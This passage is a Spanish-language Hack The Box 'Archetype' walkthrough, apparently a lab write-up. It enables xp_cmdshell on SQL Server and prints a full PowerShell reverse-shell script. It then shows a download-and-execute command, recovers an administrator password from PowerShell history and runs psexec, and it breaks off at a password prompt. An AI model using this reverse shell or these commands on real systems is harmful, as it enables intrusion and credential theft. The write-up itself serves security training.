+&lt;/li&gt;
+&lt;li&gt;serveradmin&lt;/li&gt;
+&lt;li&gt;dbcreator&lt;/li&gt;
+&lt;li&gt;setupadmin&lt;/li&gt;
+&lt;li&gt;bulkadmin&lt;/li&gt;
+&lt;li&gt;securityadmin&lt;/li&gt;
+&lt;li&gt;diskadmin&lt;ul&gt;
+&lt;li&gt;public&lt;/li&gt;
+&lt;li&gt;processadmin&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;login&lt;/code&gt;: es el nombre del servidor &lt;code&gt;SQL&lt;/code&gt; a revisar, por defecto su valor es
+    &lt;code&gt;NULL&lt;/code&gt; y toma como referencia el servidor en el que hemos iniciado&amp;nbsp;sesión.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Explicado lo anterior, en nuestra sesión de &lt;code&gt;SQL Server&lt;/code&gt; uitlizaremos el
+siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SQL&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;IS_SRVROLEMEMBER&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sysadmin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Su salida&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;-----------   &lt;/span&gt;
+
+          &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;El cual nos da como salida un valor numérico de &lt;code&gt;1&lt;/code&gt; el cual representa que el
+la sesión iniciada es miembro del rol solicitado, osea, tenemos permisos de
+&lt;code&gt;sysadmin&lt;/code&gt; en el &lt;code&gt;SQL Server&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Como tenemos permisos de administrador podemos utilizar algunas herramientas de
+configuración del servidor &lt;code&gt;SQL&lt;/code&gt; para habilitar una conexión&amp;nbsp;remota.&lt;/p&gt;
+&lt;p&gt;Para esto podemos utilizar &lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15"&gt;sp_configure&lt;/a&gt;
+el cual nos permite modificar configuraciones globales del&amp;nbsp;servidor.&lt;/p&gt;
+&lt;p&gt;Su sintaxis es la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;sp_configure&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;configname&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;hadoop connectivity&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+             &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="o"&gt;@&lt;/span&gt;&lt;span class="n"&gt;configvalue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Como podemos ver toma dos parámetros, el nombre de la configuración y su valor.
+El valor depende directamente de la configuración que estamos modificando. Una
+vez que hemos cambiado alguna configuración es necesario utilizar &lt;code&gt;reconfigure;&lt;/code&gt;
+para que se apliquen los&amp;nbsp;cambios.&lt;/p&gt;
+&lt;p&gt;Si ejecutamos &lt;code&gt;sp_configure;&lt;/code&gt; podemos ver una lista de configuraciones
+disponibles, sin embargo estamos buscando una que nos permita habilitar una
+conexión remota. Para esto habilitaremos que se muestren las opciones&amp;nbsp;avanzadas.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SQL&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;EXEC&lt;/span&gt; &lt;span class="n"&gt;sp_configure&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Show Advanced Options&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;SQL&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;reconfigure&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Al habilitar que nos muestre las opciones avanzadas podremos ver que hay una
+configuración llamada &lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15"&gt;xp_cmdshell&lt;/a&gt;
+la cual nos permite invocar una terminal de comandos de Windows y enviarle una
+cadena a&amp;nbsp;ejecutar.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;EXEC&lt;/span&gt; &lt;span class="n"&gt;sp_configure&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;reconfigure&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Ya habilitamos la configuración para utilizar &lt;code&gt;xp_cmdshell&lt;/code&gt;, podemos verificar
+los permisos o alcance de nuestra cuenta dentro de &lt;code&gt;Windows&lt;/code&gt; utilizando el
+comando &lt;code&gt;whoami&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;xp_cmdshell&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Su salida&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;output&lt;/span&gt;                                                                             
+
+&lt;span class="c1"&gt;--------------------------------------------------------------------------------   &lt;/span&gt;
+
+&lt;span class="n"&gt;archetype&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;sql_svc&lt;/span&gt;                                                                  
+
+&lt;span class="k"&gt;NULL&lt;/span&gt;                                                                               
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Podemos observar que se nos vuelve a desplegar el usuario &lt;code&gt;archetype\sql_svc&lt;/code&gt;,
+esto significa que &lt;code&gt;SQL Server&lt;/code&gt; esta corriendo con ese usuario dentro de
+&lt;code&gt;Ẁindows&lt;/code&gt;, y podemos ver un &lt;code&gt;NULL&lt;/code&gt; lo cual significa que no tiene permisos de&amp;nbsp;administrador.&lt;/p&gt;
+&lt;p&gt;Necesitamos una mejor terminal. Intentemos crear una reverse shell mediante
+&lt;code&gt;PowerShell&lt;/code&gt;. Para esto podemos utilizar el siguiente&amp;nbsp;código:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; New-Object System.Net.Sockets.TCPClient&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.10.14.3&amp;quot;&lt;/span&gt;,443&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$client&lt;/span&gt;.GetStream&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;byte&lt;span class="o"&gt;[]]&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;..65535&lt;span class="p"&gt;|&lt;/span&gt;%&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$stream&lt;/span&gt;.Read&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;, &lt;span class="m"&gt;0&lt;/span&gt;, &lt;span class="nv"&gt;$bytes&lt;/span&gt;.Length&lt;span class="o"&gt;))&lt;/span&gt; -ne &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;New-Object -TypeName System.Text.ASCIIEncoding&lt;span class="o"&gt;)&lt;/span&gt;.GetString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;,0, &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$sendback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;iex &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Out-String &lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$sendback2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$sendback&lt;/span&gt; + &lt;span class="s2"&gt;&amp;quot;# &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$sendbyte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;([&lt;/span&gt;text.encoding&lt;span class="o"&gt;]&lt;/span&gt;::ASCII&lt;span class="o"&gt;)&lt;/span&gt;.GetBytes&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendback2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$stream&lt;/span&gt;.Write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;,0,&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;.Length&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$stream&lt;/span&gt;.Flush&lt;span class="o"&gt;()}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$client&lt;/span&gt;.Close&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;La linea anterior es necesario guardarla en un archivo en tu equipo, vamos a
+llamar al archivo &lt;code&gt;shell.ps1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Ahora que lo hemos guardado en un archivo, solo por no dejar, vamos a expandir
+la linea anterior, simplemente queremos que se vea un poco mejor lo que&amp;nbsp;hace.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;$client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; New-Object System.Net.Sockets.TCPClient&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.10.14.3&amp;quot;&lt;/span&gt;,443&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nv"&gt;$stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$client&lt;/span&gt;.GetStream&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;byte&lt;span class="o"&gt;[]]&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;..65535&lt;span class="p"&gt;|&lt;/span&gt;%&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$stream&lt;/span&gt;.Read&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;, &lt;span class="m"&gt;0&lt;/span&gt;, &lt;span class="nv"&gt;$bytes&lt;/span&gt;.Length&lt;span class="o"&gt;))&lt;/span&gt; -ne &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;){&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;New-Object -TypeName System.Text.ASCIIEncoding&lt;span class="o"&gt;)&lt;/span&gt;.GetString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$bytes&lt;/span&gt;,0, &lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$sendback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;iex &lt;span class="nv"&gt;$data&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Out-String &lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$sendback2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$sendback&lt;/span&gt; + &lt;span class="s2"&gt;&amp;quot;# &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$sendbyte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;([&lt;/span&gt;text.encoding&lt;span class="o"&gt;]&lt;/span&gt;::ASCII&lt;span class="o"&gt;)&lt;/span&gt;.GetBytes&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendback2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$stream&lt;/span&gt;.Write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;,0,&lt;span class="nv"&gt;$sendbyte&lt;/span&gt;.Length&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$stream&lt;/span&gt;.Flush&lt;span class="o"&gt;()}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nv"&gt;$client&lt;/span&gt;.Close&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Si observamos, estamos viendo que se crea una conexión a la &lt;span class="caps"&gt;IP&lt;/span&gt; y el puerto
+especificado, se crea un stream de datos y a partir de aquí se codifica la
+información para poder enviarla a través de la conexión a una terminal&amp;nbsp;remota.&lt;/p&gt;
+&lt;p&gt;Recuerden cambiar la dirección &lt;span class="caps"&gt;IP&lt;/span&gt; al de su equipo. Si no conoces tu dirección
+puedes utilizar el siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ip addr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Con la &lt;span class="caps"&gt;IP&lt;/span&gt; indicada y el archivo creado, desde la terminal nos dirigimos a la
+carpeta donde guardaste el archivo. Necesitamos enviar el archivo que esta en
+nuestro equipo al servidor &lt;code&gt;SQL&lt;/code&gt; donde nos conectamos para poder ejecutarlo ahí
+y crear la reverse&amp;nbsp;shell.&lt;/p&gt;
+&lt;p&gt;Para esto, vamos a hacer los siguientes&amp;nbsp;pasos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Levantaremos un servidor &lt;code&gt;HTTP&lt;/code&gt; del cual descargaremos el&amp;nbsp;archivo&lt;/li&gt;
+&lt;li&gt;Configuramos los puertos de escucha para nuestra conexión de la reverse&amp;nbsp;shell&lt;/li&gt;
+&lt;li&gt;Configuraremos el firewall para aceptar las dos conexiones&amp;nbsp;anteriores&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;El primer punto lo haremos utilizando el interprete de &lt;code&gt;python&lt;/code&gt;, con el cual
+podemos utilizar la clase &lt;code&gt;http.server&lt;/code&gt; e indicarle el puerto de escucha.
+Recuerda que necesitar estar en la carpeta donde guardaste el archivo &lt;code&gt;shell.ps1&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 -m http.server &lt;span class="m"&gt;80&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;El segundo punto lo podemos hacer utilizando &lt;a href="https://en.wikipedia.org/wiki/Netcat"&gt;netcat&lt;/a&gt;
+la cual es una herramienta para leer o escribir conexiones de red sobre &lt;span class="caps"&gt;TCP&lt;/span&gt; o &lt;span class="caps"&gt;UDP&lt;/span&gt;.&lt;/p&gt;
+&lt;p&gt;El comando a utilizar&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -lvnp &lt;span class="m"&gt;443&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Los parámetros de &lt;code&gt;netcat&lt;/code&gt; son los&amp;nbsp;siguientes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;l&lt;/code&gt;: modo de escucha, para conexiones&amp;nbsp;entrantes&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;v&lt;/code&gt;: modo &lt;code&gt;verbose&lt;/code&gt;, para ir viendo que&amp;nbsp;sucede&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;n&lt;/code&gt;: para trabajar con direcciones &lt;span class="caps"&gt;IP&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;p&lt;/code&gt;: para indicar el puerto donde estará escuchando la conexión, que es el&amp;nbsp;443&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Para el tercer punto utilizaremos &lt;a href="https://wiki.debian.org/Uncomplicated%20Firewall%20%28ufw%29"&gt;ufw&lt;/a&gt;
+el cual es un firewall con el que vamos a gestionar los&amp;nbsp;puertos.&lt;/p&gt;
+&lt;p&gt;El comando a utilizar&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ufw allow from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27 proto tcp to any port &lt;span class="m"&gt;80&lt;/span&gt;,443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Con sus comando estamos indicando que permita (&lt;code&gt;allow&lt;/code&gt;) conexiones desde (&lt;code&gt;from&lt;/code&gt;)
+la dirección &lt;span class="caps"&gt;IP&lt;/span&gt; &lt;code&gt;10.10.10.27&lt;/code&gt; que es la que estamos atacando mediante el protocolo
+&lt;code&gt;TCP&lt;/code&gt; (&lt;code&gt;proto tcp&lt;/code&gt;) a los puertos 80 y 443 (&lt;code&gt;to any port 80,443&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;Ahora, regresemos a nuestra terminal de &lt;code&gt;SQL&lt;/code&gt;, ahi vamos a utilizar la herramienta
+&lt;code&gt;xp_cmdshell&lt;/code&gt; que utilizamos previamente, ahora invocaremos una conexión a nuestro
+servidor &lt;code&gt;HTTP&lt;/code&gt; local que nos permita descargar la reverse shell y ejecutarla.
+Al ejecutar la reverse shell se creara una conexión a nuestro equipo que sera
+aceptada por &lt;code&gt;netcat&lt;/code&gt; y desde ahi ya podremos utilizar la reverse&amp;nbsp;shell.&lt;/p&gt;
+&lt;p&gt;El comando a utilizar&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;xp_cmdshell &lt;span class="s2"&gt;&amp;quot;powershell &amp;quot;&lt;/span&gt;IEX &lt;span class="o"&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class="o"&gt;)&lt;/span&gt;.DownloadString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;http://10.10.14.3/shell.ps1&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Recuerda actualizar tu dirección &lt;span class="caps"&gt;IP&lt;/span&gt; en el comando&amp;nbsp;anterior.&lt;/p&gt;
+&lt;p&gt;Ya tenemos una reverse shell al usuario en &lt;code&gt;Windows&lt;/code&gt;, podemos proceder a extraer
+la bandera de su escritorio. Para esto podemos podemos movernos a su escritorio
+con el comando &lt;code&gt;cd&lt;/code&gt; e indicar la&amp;nbsp;ruta.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;cd C:\Users\sql_svc\Desktop&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Aquí podemos ver que se encuentra el archivo &lt;code&gt;user.txt&lt;/code&gt; el cual contiene la&amp;nbsp;bandera.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;#&lt;/span&gt; &lt;span class="n"&gt;dir&lt;/span&gt;
+
+
+    &lt;span class="n"&gt;Directory&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;sql_svc&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Desktop&lt;/span&gt;
+
+
+&lt;span class="k"&gt;Mode&lt;/span&gt;                &lt;span class="n"&gt;LastWriteTime&lt;/span&gt;         &lt;span class="k"&gt;Length&lt;/span&gt; &lt;span class="n"&gt;Name&lt;/span&gt;                                                                  
+&lt;span class="c1"&gt;----                -------------         ------ ----                                                                  &lt;/span&gt;
+&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;ar&lt;/span&gt;&lt;span class="c1"&gt;---        2/25/2020   6:37 AM             32 user.txt                                                              &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Le podemos aplicar un &lt;code&gt;type&lt;/code&gt; o un &lt;code&gt;cat&lt;/code&gt; al archivo y listo! Tenemos la primer&amp;nbsp;bandera.&lt;/p&gt;
+&lt;h2&gt;Privilege&amp;nbsp;Escalation&lt;/h2&gt;
+&lt;p&gt;Ya obtuvimos la bandera a nivel de usuario, ahora necesitamos obtener la bandera
+a nivel&amp;nbsp;administrador.&lt;/p&gt;
+&lt;p&gt;Sabemos que la cuenta en la que nos encontramos no tiene permisos de administrador
+pero que se utiliza como una cuenta para gestionar servicios, esto significa
+que en algún momento cuando se levantan los servicios se aplica algún permiso
+de administrador. Para conocer en que momento sucede podemos revisar el historial
+de comandos de &lt;code&gt;PowerShell&lt;/code&gt;. Para esto podemos utilizar el siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;type&lt;/span&gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\s&lt;/span&gt;ql_svc&lt;span class="se"&gt;\A&lt;/span&gt;ppData&lt;span class="se"&gt;\R&lt;/span&gt;oaming&lt;span class="se"&gt;\M&lt;/span&gt;icrosoft&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\P&lt;/span&gt;owerShell&lt;span class="se"&gt;\P&lt;/span&gt;SReadline&lt;span class="se"&gt;\C&lt;/span&gt;onsoleHost_history.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;La salida del comando anterior nos muestra lo&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;net.exe use T: &lt;span class="se"&gt;\\&lt;/span&gt;Archetype&lt;span class="se"&gt;\b&lt;/span&gt;ackups /user:administrator MEGACORP_4dm1n!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Con lo anterior podemos observar que el disco &lt;code&gt;backups&lt;/code&gt; que encontramos al
+conectarnos por &lt;code&gt;SMB&lt;/code&gt; fue mapeado con una cuenta local de administrador, y
+ahora tenemos su&amp;nbsp;contraseña.&lt;/p&gt;
+&lt;p&gt;Para conectarnos utlizaremos una versión de &lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"&gt;PsExec&lt;/a&gt; incluida en &lt;code&gt;impacket&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;De igual manera que el comando de &lt;code&gt;mssqlclient&lt;/code&gt; lo invocaremos a traves del
+interprete de &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python3 psexec.py administrator@10.10.10.27
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Se nos pedirá la contraseña, y después de ingresarla veremos que la conexión
+es satisfactoria, de tal modo que tenemos una terminal con permisos de&amp;nbsp;administrador.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Impacket v0.9.21 - Copyright &lt;span class="m"&gt;2020&lt;/span&gt; SecureAuth Corporation
+
+Password:
